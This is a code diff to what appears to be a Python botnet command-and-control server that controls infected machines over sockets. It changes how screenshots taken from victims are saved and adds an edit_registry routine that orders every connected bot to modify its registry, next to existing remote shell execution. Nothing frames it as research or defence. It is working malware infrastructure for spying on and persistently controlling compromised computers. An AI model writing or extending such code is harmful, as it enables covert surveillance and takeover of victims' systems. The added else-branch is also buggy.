@@ -123,7 +123,8 @@ def get_screenshot(addr):
     image = botnet[addr].recv(int(size))
     check_container(addr)
     #os.chdir(addr)
-    file = open("scrnshot.jpeg",'wb')
+    extension = ".png"
+    file = open("scrnshot"+extension,'wb')
     file.write(image)
     file.close()
 
@@ -142,6 +143,19 @@ def exec_command(cmd):
         #packet = struct.pack("<H%ds"%(cmd_size),cmd_size,cmd) # H --> 2 Bytes Buffer Size
         #bot.send(packet)
         #print("[*] Command packet sent")
+
+def edit_registry():
+    global botnet
+    for bot in botnet:
+        botnet[bot].send("REGISTRY".encode())
+        sleep(1)
+        resp = botnet[bot].recv(1024).decode()
+        if(resp == "OK"):
+            sleep(1)
+            pass
+        elif(resp == "FAILED"):
+            print("[*] Failed to edit registry on %s"%(bot))
+
 
 def process_cmd(cmd):
         global botnet
@@ -171,11 +185,16 @@ def process_cmd(cmd):
         if "shell" in cmd:
             shell_exec(cmd)
 
+        if "registry" in cmd:
+            edit_registry()
+
         if 'test' in cmd:
             cmd = cmd.strip("test ")
             t1 = Thread(target=test_bots,args=())
             t1.start()
             pass
+        else:
+            print("[*] Invalid command")
 
 
 def main():
